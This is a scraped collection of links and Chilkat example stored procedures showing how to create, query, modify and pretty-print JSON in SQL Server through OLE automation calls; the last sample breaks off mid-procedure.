https://blog.ip2location.com/knowledge-base/how-to-automate-downloading-unzipping-loading-of-ip2proxy-csv-data-into-linux-mysql-ipv4/
https://blog.ip2location.com/knowledge-base/how-to-import-ip2proxy-csv-data-into-mssql-2017-ipv4/
https://www.red-gate.com/simple-talk/sql/t-sql-programming/importing-json-collections-sql-server/
https://www.red-gate.com/hub/product-learning/sql-data-generator/generating-test-data-json-files-using-sql-data-generator
https://www.mssqltips.com/sqlservertip/3272/example-using-web-services-with-sql-server-integration-services/
https://www.mssqltips.com/sqlservertip/3309/accessing-ole-and-com-objects-from-sql-server-using-ole-automation-stored-procedures/

https://kamakshisuram.wordpress.com/issues-handled/sql-server-blocked-access-to-procedure-sys-sp_oacreate/
https://gist.github.com/jarrettmeyer/5990daf0db3b1f4fd759df6ed4099685
https://www.sqlservercentral.com/articles/writing-to-a-file-using-the-sp_oacreate-stored-procedure-and-osql-the
https://www.databasejournal.com/features/mssql/article.php/1442201/Working-with-COM-Objects-from-within-T-SQL.htm











https://www.example-code.com/sql/json_paths.asp

(SQL Server) JSON Paths
Demonstrates using "Chilkat JSON Paths" to access parts of a JSON document, or to iterate over parts.

This example uses the following JSON document:

{
    "nestedArray" : [
			[
				[1,2,3],
				[4,5,6],
				[7,8,9,10]
			],
			[
				[11,12,13],
				[14,15,16],
				[17,18,19,20]
			],
			[
				[21,22,23],
				[24,25,26],
				[27,28,29,30],
				[31,32,33,34,35,36]
			]
		],

	"nestedObject" : {
		"aaa" : {
			"bb1" : {
				"cc1" : "c1Value",
				"cc2" : "c2Value",
				"cc3" : "c3Value"
			},
			"bb2" : {
				"dd1" : "d1Value",
				"dd2" : "d2Value",
				"dd3" : "d3Value"
			}
		}
	},

	"mixture" : {
		"arrayA" : [  
			{ "fruit": "apple", "animal": "horse", "job": "fireman", "colors": ["red","blue","green"] },
			{ "fruit": "pear", "animal": "plankton", "job": "waiter", "colors": ["yellow","orange","purple"] },
			{ "fruit": "kiwi", "animal": "echidna", "job": "astronaut", "colors": ["magenta","tan","pink"] }
			]
	},


        "name.with.dots" : { "grain" : "oats" }

	
}



CREATE PROCEDURE json_paths
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @json, 'EmitCompact', 0

    -- Assume the file contains the data as shown above..
    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/pathSample.json'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @json, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    -- First, let's get the value of "cc1"
    -- The path to this value is: nestedObject.aaa.bb1.cc1
    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'nestedObject.aaa.bb1.cc1'
    PRINT @sTmp0

    -- Now let's get number 18 from the nestedArray.
    -- It is located at nestedArray[1][2][1]
    -- (remember: Indexing is 0-based)

    EXEC sp_OAMethod @json, 'IntOf', @iTmp0 OUT, 'nestedArray[1][2][1]'
    PRINT 'This should be 18: ' + @iTmp0

    -- We can do the same thing in a more roundabout way using the 
    -- I, J, and K properties.  (The I,J,K properties will be convenient
    -- for iterating over arrays, as we'll see later.)
    EXEC sp_OASetProperty @json, 'I', 1
    EXEC sp_OASetProperty @json, 'J', 2
    EXEC sp_OASetProperty @json, 'K', 1

    EXEC sp_OAMethod @json, 'IntOf', @iTmp0 OUT, 'nestedArray[i][j][k]'
    PRINT 'This should be 18: ' + @iTmp0

    -- Let's iterate over the array containing the numbers 17, 18, 19, 20.
    -- First, use the SizeOfArray method to get the array size:
    DECLARE @sz int
    EXEC sp_OAMethod @json, 'SizeOfArray', @sz OUT, 'nestedArray[1][2]'
    -- The size should be 4.


    PRINT 'size of array = ' + @sz + ' (should equal 4)'

    -- Now iterate...
    DECLARE @i int

    SELECT @i = 0
    WHILE @i <= @sz - 1
      BEGIN
        EXEC sp_OASetProperty @json, 'I', @i
        EXEC sp_OAMethod @json, 'IntOf', @iTmp0 OUT, 'nestedArray[1][2][i]'
        PRINT @iTmp0
        SELECT @i = @i + 1
      END

    -- Let's use a triple-nested loop to iterate over the nestedArray:
    DECLARE @j int

    DECLARE @k int

    -- szI should equal 1.
    DECLARE @szI int
    EXEC sp_OAMethod @json, 'SizeOfArray', @szI OUT, 'nestedArray'
    SELECT @i = 0
    WHILE @i <= @szI - 1
      BEGIN
        EXEC sp_OASetProperty @json, 'I', @i

        DECLARE @szJ int
        EXEC sp_OAMethod @json, 'SizeOfArray', @szJ OUT, 'nestedArray[i]'
        SELECT @j = 0
        WHILE @j <= @szJ - 1
          BEGIN
            EXEC sp_OASetProperty @json, 'J', @j

            DECLARE @szK int
            EXEC sp_OAMethod @json, 'SizeOfArray', @szK OUT, 'nestedArray[i][j]'
            SELECT @k = 0
            WHILE @k <= @szK - 1
              BEGIN
                EXEC sp_OASetProperty @json, 'K', @k

                EXEC sp_OAMethod @json, 'IntOf', @iTmp0 OUT, 'nestedArray[i][j][k]'
                PRINT @iTmp0
                SELECT @k = @k + 1
              END
            SELECT @j = @j + 1
          END
        SELECT @i = @i + 1
      END

    -- Now let's examine how to navigate to JSON objects contained within JSON arrays.
    -- This line of code gets the value "kiwi" contained within "mixture"
    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'mixture.arrayA[2].fruit'
    PRINT @sTmp0

    -- This line of code gets the color "yellow"
    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, 'mixture.arrayA[1].colors[0]'
    PRINT @sTmp0

    -- Getting an object at a path:
    -- This gets the 2nd object in "arrayA"
    DECLARE @obj2 int
    EXEC sp_OAMethod @json, 'ObjectOf', @obj2 OUT, 'mixture.arrayA[1]'
    -- This object's "animal" should be "plankton"
    EXEC sp_OAMethod @obj2, 'StringOf', @sTmp0 OUT, 'animal'
    PRINT @sTmp0

    -- Note that paths are relative to the object, not the absolute root of the JSON document.
    -- Starting from obj2, "purple" is at "colors[2]"
    EXEC sp_OAMethod @obj2, 'StringOf', @sTmp0 OUT, 'colors[2]'
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @obj2

    -- Getting an array at a path:
    -- This gets the array containing the colors red, green, blue:
    DECLARE @arr1 int
    EXEC sp_OAMethod @json, 'ArrayOf', @arr1 OUT, 'mixture.arrayA[0].colors'
    DECLARE @szArr1 int
    EXEC sp_OAGetProperty @arr1, 'Size', @szArr1 OUT
    SELECT @i = 0
    WHILE @i <= @szArr1 - 1
      BEGIN

        EXEC sp_OAMethod @arr1, 'StringAt', @sTmp0 OUT, @i
        PRINT @i + ': ' + @sTmp0
        SELECT @i = @i + 1
      END
    EXEC @hr = sp_OADestroy @arr1

    -- The Chilkat JSON path uses ".", "[", and "]" chars for separators.  When a name
    -- contains one of these chars, use double-quotes in the path:
    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, '"name.with.dots".grain'
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO

https://www.example-code.com/sql/create_json.asp

(SQL Server) Create JSON Document
Sample code to create the following JSON document:

{
  "Title": "Pan's Labyrinth",
  "Director": "Guillermo del Toro",
  "Original_Title": "El laberinto del fauno",
  "Year_Released": 2006
}

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int

    --  The only reason for failure in the following lines of code would be an out-of-memory condition..

    --  An index value of -1 is used to append at the end.
    DECLARE @index int
    SELECT @index = -1

    EXEC sp_OAMethod @json, 'AddStringAt', @success OUT, -1, 'Title', 'Pan''s Labyrinth'
    EXEC sp_OAMethod @json, 'AddStringAt', @success OUT, -1, 'Director', 'Guillermo del Toro'
    EXEC sp_OAMethod @json, 'AddStringAt', @success OUT, -1, 'Original_Title', 'El laberinto del fauno'
    EXEC sp_OAMethod @json, 'AddIntAt', @success OUT, -1, 'Year_Released', 2006

    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO


https://www.example-code.com/sql/json_index_of.asp



(SQL Server) Get the Index of a JSON Member
This example demonstrates how to get the index of a given member by name.

{
  "name": "donut",
  "image":
    {
    "fname": "donut.jpg",
    "w": 200,
    "h": 200
    },
  "thumbnail":
    {
    "fname": "donutThumb.jpg",
    "w": 32,
    "h": 32
    }
}


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- This is the above JSON with whitespace chars removed (SPACE, TAB, CR, and LF chars).
    -- The presence of whitespace chars for pretty-printing makes no difference to the Load
    -- method. 
    DECLARE @jsonStr nvarchar(4000)
    SELECT @jsonStr = '{"name": "donut","image":{"fname": "donut.jpg","w": 200,"h": 200},"thumbnail":{"fname": "donutThumb.jpg","w": 32,"h": 32}}'

    DECLARE @success int
    EXEC sp_OAMethod @json, 'Load', @success OUT, @jsonStr
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @json, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    -- The top-level JSON object has three members: name, image, and thumbnail.
    DECLARE @nameIndex int
    EXEC sp_OAMethod @json, 'IndexOf', @nameIndex OUT, 'name'
    -- The index of the "name" member is 0.

    PRINT 'nameIndex = ' + @nameIndex

    DECLARE @thumbIndex int
    EXEC sp_OAMethod @json, 'IndexOf', @thumbIndex OUT, 'thumbnail'
    -- The index of the "thumbnail" member is 2.

    PRINT 'thumbIndex = ' + @thumbIndex

    -- The "fname" member is NOT a direct member of the top-level JSON object.
    -- It is a member of a nested object.  If we try to get the index of this
    -- member using the top-level JSON object, it is not found (and returns -1).
    DECLARE @fnameIndex int
    EXEC sp_OAMethod @json, 'IndexOf', @fnameIndex OUT, 'fname'
    -- The fnameIndex is -1 (not found).  This is correct.

    PRINT 'fnameIndex = ' + @fnameIndex

    -- Get the "image" object.
    DECLARE @imageObj int
    EXEC sp_OAMethod @json, 'ObjectOf', @imageObj OUT, 'image'
    EXEC sp_OAGetProperty @json, 'LastMethodSuccess', @iTmp0 OUT
    IF @iTmp0 = 0
      BEGIN

        PRINT 'image object not found.'
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    -- Now we can get the index of the "fname" object, because it is a direct
    -- member of the "image" object:
    EXEC sp_OAMethod @imageObj, 'IndexOf', @fnameIndex OUT, 'fname'

    PRINT 'fnameIndex = ' + @fnameIndex

    EXEC @hr = sp_OADestroy @imageObj


    EXEC @hr = sp_OADestroy @json


END
GO



https://www.example-code.com/sql/json_pretty_print.asp


(SQL Server) Pretty Print JSON (Formatter, Beautifier)
Demonstrates how to emit JSON in a pretty, human-readable format with indenting of nested arrays and objects.

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @jsonStr nvarchar(4000)
    SELECT @jsonStr = '{"name": "donut","image":{"fname": "donut.jpg","w": 200,"h": 200},"thumbnail":{"fname": "donutThumb.jpg","w": 32,"h": 32}}'

    DECLARE @success int
    EXEC sp_OAMethod @json, 'Load', @success OUT, @jsonStr
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @json, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    --  To pretty-print, set the EmitCompact property equal to 0
    EXEC sp_OASetProperty @json, 'EmitCompact', 0

    --  If bare-LF line endings are desired, turn off EmitCrLf
    --  Otherwise CRLF line endings are emitted.
    EXEC sp_OASetProperty @json, 'EmitCrLf', 0

    --  Emit the formatted JSON:
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO



https://www.example-code.com/sql/json_modify.asp


(SQL Server) Modify Parts of JSON Document
Demonstrates how to modify parts of a JSON document. This example uses the following JSON document:

{
   "fruit": [
      	{
         "kind": "apple",
	 "count": 24,
	 "fresh": true,
	 "extraInfo": null,
	 "listA": [ "abc", 1, null, false ],
	 "objectB": { "animal" : "monkey" }
      	},
	{
         "kind": "pear",
	 "count": 18,
	 "fresh": false,
	 "extraInfo": null
	 "listA": [ "xyz", 24, null, true ],
	 "objectB": { "animal" : "lemur" }
	}
    ],
    "list" : [ "banana", 12, true, null, "orange", 12.5, { "ticker": "AAPL" }, [ 1, 2, 3, 4, 5 ] ],
    "alien" : true
}


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    --  Load the JSON from a file.
    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/modifySample.json'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @json, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    --  This example will not check for errors (i.e. null / false / 0 return values)...

    --  Get the "list" array:
    DECLARE @listA int
    EXEC sp_OAMethod @json, 'ArrayOf', @listA OUT, 'list'

    --  Modify values in the list.

    --  Change banana to plantain
    EXEC sp_OAMethod @listA, 'SetStringAt', @success OUT, 0, 'plantain'

    --  Change 12 to 24
    EXEC sp_OAMethod @listA, 'SetIntAt', @success OUT, 1, 24

    --  Change true to false
    EXEC sp_OAMethod @listA, 'SetBoolAt', @success OUT, 2, 0

    --  Is the 3rd item null?
    DECLARE @bNull int
    EXEC sp_OAMethod @listA, 'IsNullAt', @bNull OUT, 3

    --  Change "orange" to 32.
    EXEC sp_OAMethod @listA, 'SetIntAt', @success OUT, 4, 32

    --  Change 12.5 to 31.2
    EXEC sp_OAMethod @listA, 'SetNumberAt', @success OUT, 5, '31.2'

    --  Replace the { "ticker" : "AAPL" } object with { "ticker" : "GOOG" }
    --  Do this by deleting, then inserting a new object at the same location.
    EXEC sp_OAMethod @listA, 'DeleteAt', @success OUT, 6
    EXEC sp_OAMethod @listA, 'AddObjectAt', @success OUT, 6
    DECLARE @tickerObj int
    EXEC sp_OAMethod @listA, 'ObjectAt', @tickerObj OUT, 6
    EXEC sp_OAMethod @tickerObj, 'AddStringAt', @success OUT, -1, 'ticker', 'GOOG'

    EXEC @hr = sp_OADestroy @tickerObj

    --  Replace "[ 1, 2, 3, 4, 5 ]" with "[ "apple", 22, true, null, 1080.25 ]"
    EXEC sp_OAMethod @listA, 'DeleteAt', @success OUT, 7
    EXEC sp_OAMethod @listA, 'AddArrayAt', @success OUT, 7
    DECLARE @aa int
    EXEC sp_OAMethod @listA, 'ArrayAt', @aa OUT, 7
    EXEC sp_OAMethod @aa, 'AddStringAt', @success OUT, -1, 'apple'
    EXEC sp_OAMethod @aa, 'AddIntAt', @success OUT, -1, 22
    EXEC sp_OAMethod @aa, 'AddBoolAt', @success OUT, -1, 1
    EXEC sp_OAMethod @aa, 'AddNullAt', @success OUT, -1
    EXEC sp_OAMethod @aa, 'AddNumberAt', @success OUT, -1, '1080.25'
    EXEC @hr = sp_OADestroy @aa

    EXEC @hr = sp_OADestroy @listA

    --  Get the "fruit" array
    DECLARE @aFruit int
    EXEC sp_OAMethod @json, 'ArrayAt', @aFruit OUT, 0

    --  Get the 1st element:
    DECLARE @appleObj int
    EXEC sp_OAMethod @aFruit, 'ObjectAt', @appleObj OUT, 0

    --  Modify values by member name:
    EXEC sp_OAMethod @appleObj, 'SetStringOf', @success OUT, 'fruit', 'fuji_apple'
    EXEC sp_OAMethod @appleObj, 'SetIntOf', @success OUT, 'count', 46
    EXEC sp_OAMethod @appleObj, 'SetBoolOf', @success OUT, 'fresh', 0
    EXEC sp_OAMethod @appleObj, 'SetStringOf', @success OUT, 'extraInfo', 'developed by growers at the Tohoku Research Station in Fujisaki'

    EXEC @hr = sp_OADestroy @appleObj

    --  Modify values by index:
    DECLARE @pearObj int
    EXEC sp_OAMethod @aFruit, 'ObjectAt', @pearObj OUT, 1
    EXEC sp_OAMethod @pearObj, 'SetStringAt', @success OUT, 0, 'bartlett_pear'
    EXEC sp_OAMethod @pearObj, 'SetIntAt', @success OUT, 1, 12
    EXEC sp_OAMethod @pearObj, 'SetBoolAt', @success OUT, 2, 0
    EXEC sp_OAMethod @pearObj, 'SetStringAt', @success OUT, 3, 'harvested in late August to early September'
    EXEC @hr = sp_OADestroy @pearObj

    EXEC @hr = sp_OADestroy @aFruit

    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO





https://www.example-code.com/sql/json_rename_delete.asp


(SQL Server) JSON: Renaming and Deleting Members
Demonstrates renaming and deleting members. This example uses the following JSON document:

{
   "apple": "red",
   "lime": "green",
   "banana": "yellow",
   "broccoli": "green",
   "strawberry": "red"
}


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int
    EXEC sp_OAMethod @json, 'Load', @success OUT, '{"apple": "red","lime": "green","banana": "yellow","broccoli": "green","strawberry": "red"}'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @json, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    --  Rename "lime" to "lemon".
    EXEC sp_OAMethod @json, 'Rename', @success OUT, 'lime', 'lemon'
    --  Change the color to yellow:
    EXEC sp_OAMethod @json, 'SetStringOf', @success OUT, 'lemon', 'yellow'

    --  Rename by index.  Banana is at index 2 (apple is at index 0)
    EXEC sp_OAMethod @json, 'RenameAt', @success OUT, 2, 'bartlett_pear'

    --  Delete broccoli by name
    EXEC sp_OAMethod @json, 'Delete', @success OUT, 'broccoli'

    --  Delete apple by index.  Apple is at index 0.
    EXEC sp_OAMethod @json, 'DeleteAt', @success OUT, 0

    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO

https://www.example-code.com/sql/json_misc_ops.asp

(SQL Server) JSON: Miscellaneous Operations
Demonstrates a variety of JSON API methods. This example uses the following JSON document:

{
   "alphabet": "abcdefghijklmnopqrstuvwxyz",
   "sampleData" : {
           "pi": 3.14,
	   "apple": "juicy",
	   "hungry": true,
	   "withoutValue": null,
           "answer": 42
          
	}
}

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @json, 'EmitCompact', 0

    --  Assume the file contains the data as shown above..
    DECLARE @success int
    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/sample2.json'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @json, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @json
        RETURN
      END

    --  First navigate to the "sampleData" object:
    DECLARE @sampleData int
    EXEC sp_OAMethod @json, 'ObjectOf', @sampleData OUT, 'sampleData'

    --  Demonstrate BoolAt and BoolOf

    EXEC sp_OAMethod @sampleData, 'BoolOf', @iTmp0 OUT, 'hungry'
    PRINT 'hungry: ' + @iTmp0

    EXEC sp_OAMethod @sampleData, 'BoolAt', @iTmp0 OUT, 2
    PRINT 'hungry: ' + @iTmp0

    --  StringOf returns the value as a string regardless of it's actual type:

    EXEC sp_OAMethod @sampleData, 'StringOf', @sTmp0 OUT, 'pi'
    PRINT 'pi: ' + @sTmp0

    EXEC sp_OAMethod @sampleData, 'StringOf', @sTmp0 OUT, 'answer'
    PRINT 'answer: ' + @sTmp0

    EXEC sp_OAMethod @sampleData, 'StringOf', @sTmp0 OUT, 'withoutValue'
    PRINT 'withoutValue: ' + @sTmp0

    EXEC sp_OAMethod @sampleData, 'StringOf', @sTmp0 OUT, 'hungry'
    PRINT 'hungry: ' + @sTmp0

    --  Demonstrate IsNullOf / IsNullAt

    EXEC sp_OAMethod @sampleData, 'IsNullOf', @iTmp0 OUT, 'withoutValue'
    PRINT 'withoutValue is null? ' + @iTmp0

    EXEC sp_OAMethod @sampleData, 'IsNullAt', @iTmp0 OUT, 3
    PRINT 'withoutValue is null? ' + @iTmp0

    EXEC sp_OAMethod @sampleData, 'IsNullOf', @iTmp0 OUT, 'apple'
    PRINT 'apple is null? ' + @iTmp0

    EXEC sp_OAMethod @sampleData, 'IsNullAt', @iTmp0 OUT, 1
    PRINT 'apple is null? ' + @iTmp0

    --  IntOf

    EXEC sp_OAMethod @sampleData, 'IntOf', @iTmp0 OUT, 'answer'
    PRINT 'answer: ' + @iTmp0

    --  SetNullAt, SetNullOf
    --  Set "pi" to null
    EXEC sp_OAMethod @sampleData, 'SetNullAt', @success OUT, 0
    --  Set "answer" to null
    EXEC sp_OAMethod @sampleData, 'SetNullOf', @success OUT, 'answer'

    --  Show the changes:
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  Restore pi and apple:
    EXEC sp_OAMethod @sampleData, 'SetNumberAt', @success OUT, 0, '3.14'
    EXEC sp_OAMethod @sampleData, 'SetNumberOf', @success OUT, 'answer', '42'

    --  Show the changes:
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  Add a null value named "afterApple" just after "apple"
    EXEC sp_OAMethod @sampleData, 'AddNullAt', @success OUT, 2, 'afterApple'

    --  Add a boolean value just after "pi"
    EXEC sp_OAMethod @sampleData, 'AddBoolAt', @success OUT, 1, 'afterPi', 0

    EXEC @hr = sp_OADestroy @sampleData

    --  Examine the changes..
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO




https://www.example-code.com/sql/json_load_to_path.asp

(SQL Server) Load JSON Data at Path
Demonstrates how to load JSON data into a path within a JSON database. For example, we begin with this JSON:

{
  "a": 1,
  "b": 2,
  "c": {
    "x": 1,
    "y": 2
  }
}
Then we load {"mm": 11, "nn": 22} to "c", and the result is this JSON:
{
  "a": 1,
  "b": 2,
  "c": {
    "mm": 11,
    "nn": 22
  }
}


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    --  Demonstrates how to load replace the data at a location within a JSON database.

    DECLARE @p nvarchar(4000)
    SELECT @p = '{"a": 1, "b": 2, "c": { "x": 1, "y": 2 } }'

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @json, 'Load', @success OUT, @p
    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    DECLARE @q nvarchar(4000)
    SELECT @q = '{"mm": 11, "nn": 22}'

    DECLARE @c int
    EXEC sp_OAMethod @json, 'ObjectOf', @c OUT, 'c'
    EXEC sp_OAMethod @c, 'Load', @success OUT, @q
    EXEC @hr = sp_OADestroy @c

    --  See that x and y are replaced with mm and nn.
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO


https://www.example-code.com/sql/json_firebase_put_patch.asp


(SQL Server) Firebase JSON Put and Patch
Demonstrates how to apply Firebase put and patch events to a JSON database.

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json1 nvarchar(4000)
    SELECT @json1 = '{"a": 1, "b": 2}'

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    --  Use Firebase delimiters for JSON paths.
    EXEC sp_OASetProperty @json, 'DelimiterChar', '/'

    EXEC sp_OAMethod @json, 'Load', @success OUT, @json1
    EXEC sp_OAMethod @json, 'FirebasePut', @success OUT, '/c', '{"foo": true, "bar": false}'
    --  Output should be: {"a":1,"b":2,"c":{"foo":true,"bar":false}}

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT '1) ' + @sTmp0

    EXEC sp_OAMethod @json, 'FirebasePut', @success OUT, '/c', '"hello world"'
    --  Output should be: {"a":1,"b":2,"c":"hello world"}

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT '2) ' + @sTmp0

    EXEC sp_OAMethod @json, 'FirebasePut', @success OUT, '/c', '{"foo": "abc", "bar": 123}'
    --  Output should be: {"a":1,"b":2,"c":{"foo":"abc","bar":123}}

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT '3) ' + @sTmp0

    --  Back to the original..
    EXEC sp_OAMethod @json, 'FirebasePut', @success OUT, '/', '{"a": 1, "b": 2}'

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT '4) ' + @sTmp0

    EXEC sp_OAMethod @json, 'FirebasePut', @success OUT, '/c', '{"foo": true, "bar": false}'
    EXEC sp_OAMethod @json, 'FirebasePatch', @success OUT, '/c', '{"foo": 3, "baz": 4}'
    --  Output should be: {"a":1,"b":2,"c":{"foo":3,"bar":false,"baz":4}}

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT '5) ' + @sTmp0

    EXEC sp_OAMethod @json, 'FirebasePatch', @success OUT, '/c', '{"foo": "abc123", "baz": {"foo": true, "bar": false}, "bax": {"foo": 200, "bar": 400} }'
    --  Output should be: {"a":1,"b":2,"c":{"foo":"abc123","bar":false,"baz":{"foo":true,"bar":false},"bax":{"foo":200,"bar":400}}}

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT '6) ' + @sTmp0

    EXEC @hr = sp_OADestroy @json


END
GO




https://www.example-code.com/sql/json_estimote.asp


(SQL Server) JSON Estimote Data
Demonstrates accessing some data from an Estimote REST API response. The Estimate REST API responds with a JSON array (i.e. something beginning with "[" and ending with "]"). To parse, this must be made into a JSON object by prepending "{"*":" and appending "}".

This example uses the following JSON object:

{"*":[{
        "id" : "B9407F30-F5F8-466E-AFF9-25556B57FE6D:28203:50324",
        "uuid" : "B9407F30-F5F8-466E-AFF9-25556B57FE6D",
        "major" : 28203,
        "minor" : 50324,
        "mac" : "dd6fc4946e2b",
        "settings" : {
            "battery" : 100,
            "interval" : 950,
            "hardware" : "D3.4",
            "firmware" : "A3.2.0",
            "basic_power_mode" : true,
            "smart_power_mode" : true,
            "timezone" : "America/Los_Angeles",
            "security" : false,
            "motion_detection" : true,
            "latitude": 37.7979,
            "longitude": -122.4408,
            "conditional_broadcasting" : "flip to stop",
            "broadcasting_scheme" : "estimote",
            "range" : -12,
            "power" : -12,
            "firmware_deprecated" : false,
            "firmware_newest" : true,
            "location" : null
        },
        "color" : "blueberry",
        "context_id" : 339488,
        "name" : "blueberry ibeacon1",
        "battery_life_expectancy_in_days" : 1377,
        "tags" : []
    }, {
        "id" : "B9407F30-F5F8-466E-AFF9-25556B57FE6D:25845:21739",
        "uuid" : "B9407F30-F5F8-466E-AFF9-25556B57FE6D",
        "major" : 25845,
        "minor" : 21739,
        "mac" : "ff5454eb64f5",
        "settings" : {
            "battery" : 100,
            "interval" : 950,
            "hardware" : "D3.4",
            "firmware" : "A3.2.0",
            "basic_power_mode" : false,
            "smart_power_mode" : true,
            "timezone" : "America/Los_Angeles",
            "security" : false,
            "motion_detection" : true,
            "conditional_broadcasting" : "flip to stop",
            "broadcasting_scheme" : "estimote",
            "range" : -12,
            "power" : -12,
            "firmware_deprecated" : false,
            "firmware_newest" : true,
            "location" : null
        },
        "color" : "blueberry",
        "context_id" : 339483,
        "name" : "blueberry2",
        "battery_life_expectancy_in_days" : 1168,
        "tags" : []
    }
]}


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
